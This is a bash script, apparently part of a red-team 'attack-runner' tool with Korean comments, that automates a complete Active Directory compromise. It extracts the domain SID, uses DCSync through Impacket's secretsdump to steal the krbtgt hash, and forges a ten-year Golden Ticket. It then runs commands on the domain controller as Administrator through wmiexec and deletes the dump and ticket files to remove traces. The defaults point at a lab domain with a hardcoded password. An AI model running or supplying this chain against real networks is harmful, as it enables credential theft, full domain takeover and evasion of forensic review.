#!/usr/bin/env bash
set -eu

RUN_ID="${1:-run-manual}"
PARAMS_JSON="${2:-}"
if [ -z "$PARAMS_JSON" ]; then
  PARAMS_JSON='{}'
fi

VENV_PYTHON="/home/ubuntu/attack-runner/venv/bin/python3"
SECRETSDUMP="/home/ubuntu/attack-runner/venv/bin/secretsdump.py"
TICKETER="/home/ubuntu/attack-runner/venv/bin/ticketer.py"
WMIEXEC="/home/ubuntu/attack-runner/venv/bin/wmiexec.py"
TMP_DUMP_FILE="/tmp/dcsync_${RUN_ID}.txt"

get_param() {
  local key="$1"
  local default_value="${2:-}"
  "$VENV_PYTHON" - "$PARAMS_JSON" "$key" "$default_value" <<'PY'
import json
import sys
raw = sys.argv[1]
key = sys.argv[2]
default_value = sys.argv[3]
try:
    data = json.loads(raw)
    value = data.get(key, default_value)
    print(value if value is not None else "")
except:
    print(default_value)
PY
}

TARGET_IP="$(get_param target_ip "100.78.216.49")"
DOMAIN_NAME="$(get_param domain_name "lab.local")"
ADMIN_USER="$(get_param admin_user "lab_admin")"
ADMIN_PASS="$(get_param admin_pass "AdminP@ss123!")"
FAKE_USER="$(get_param fake_user "Administrator")"

DOMAIN_REALM=$(echo "$DOMAIN_NAME" | tr '[:lower:]' '[:upper:]')

echo "=================================================="
echo "[INFO] Ultimate Attack: DCSync & Golden Ticket"
echo "=================================================="

# ==========================================
# [STEP 1] rpcclient 및 Python으로 Domain SID & 진짜 호스트명 완벽 추출
# ==========================================
echo "[INFO] 1단계: 도메인 고유 식별자(SID) 및 DC 호스트명 추출 중..."
set +e
LSA_OUTPUT=$(rpcclient -U "${DOMAIN_NAME}\\${ADMIN_USER}%${ADMIN_PASS}" -c lsaquery "${TARGET_IP}" 2>&1)
set -e

DOMAIN_SID=$(echo "$LSA_OUTPUT" | grep -oP 'S-1-5-[0-9-]+(-[0-9]+)+')

DC_HOSTNAME=$("$VENV_PYTHON" -c "
import sys
try:
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(sys.argv[1], sys.argv[1])
    smb.login(sys.argv[2], sys.argv[3], sys.argv[4])
    print(smb.getServerName())
except Exception as e:
    pass
" "$TARGET_IP" "$ADMIN_USER" "$ADMIN_PASS" "$DOMAIN_NAME")

DC_FQDN="${DC_HOSTNAME}.${DOMAIN_NAME}"

if [ -z "$DOMAIN_SID" ] || [ -z "$DC_HOSTNAME" ]; then
    echo "[FAILURE] Domain SID 또는 호스트명을 가져오지 못했습니다."
    exit 1
fi
echo "[SUCCESS] Domain SID 확인: $DOMAIN_SID"
echo "[SUCCESS] 타겟 DC 이름(FQDN) 확인: $DC_FQDN"
echo ""

# ==========================================
# [STEP 2] DCSync 공격 (krbtgt 해시 덤프)
# ==========================================
echo "[INFO] 2단계: 복제 권한(DCSync)을 악용하여 krbtgt 해시 덤프 시도..."

set +e
"$VENV_PYTHON" "$SECRETSDUMP" "${DOMAIN_NAME}/${ADMIN_USER}:${ADMIN_PASS}@${TARGET_IP}" -just-dc-user krbtgt > "$TMP_DUMP_FILE" 2>&1
DCSYNC_RC=$?
set -e

if [ $DCSYNC_RC -ne 0 ] || ! grep -q "krbtgt:" "$TMP_DUMP_FILE"; then
    echo "[FAILURE] DCSync 공격 실패."
    rm -f "$TMP_DUMP_FILE"
    exit 1
fi

KRBTGT_NTHASH=$(cat "$TMP_DUMP_FILE" | grep "krbtgt:" | cut -d':' -f4)
echo "[SUCCESS] krbtgt NTLM 해시 탈취 완료!"
echo ""

# ==========================================
# [STEP 3] Golden Ticket 위조
# ==========================================
echo "[INFO] 3단계: 탈취한 정보로 10년짜리 Golden Ticket 생성 중..."

export KRB5CCNAME="/tmp/${FAKE_USER}_golden_${RUN_ID}.ccache"

set +e
"$VENV_PYTHON" "$TICKETER" -nthash "$KRBTGT_NTHASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN_REALM" "$FAKE_USER" > /dev/null 2>&1
set -e

if [ -f "${FAKE_USER}.ccache" ]; then
    mv "${FAKE_USER}.ccache" "$KRB5CCNAME"
    echo "[SUCCESS] Golden Ticket 생성 완료! (대상: $FAKE_USER)"
else
    echo "[FAILURE] Golden Ticket 생성 실패."
    exit 1
fi
echo ""

# ==========================================
# [STEP 4] Golden Ticket을 이용한 자동 원격 접속 테스트
# ==========================================
echo "[INFO] 4단계: 위조된 티켓을 사용하여 DC 최고 관리자 권한 명령 실행..."

set +e
WMI_OUTPUT=$("$VENV_PYTHON" "$WMIEXEC" -k -no-pass -dc-ip "${TARGET_IP}" -target-ip "${TARGET_IP}" "${DOMAIN_REALM}/${FAKE_USER}@${DC_FQDN}" "whoami" 2>&1)
WMI_RC=$?
set -e

echo "--------------------------------------------------"
if echo "$WMI_OUTPUT" | grep -qi "administrator\|system"; then
    echo "[SUCCESS] 원격 명령 실행 성공"
    echo " ↳ 원격 실행 결과:"
    echo "$WMI_OUTPUT"
else
    echo "[WARNING] 원격 명령 실행 실패"
    echo " ↳ 서버 응답:"
    echo "$WMI_OUTPUT"
fi
echo "--------------------------------------------------"

# 흔적 삭제
rm -f "$TMP_DUMP_FILE"
rm -f "$KRB5CCNAME"

exit 0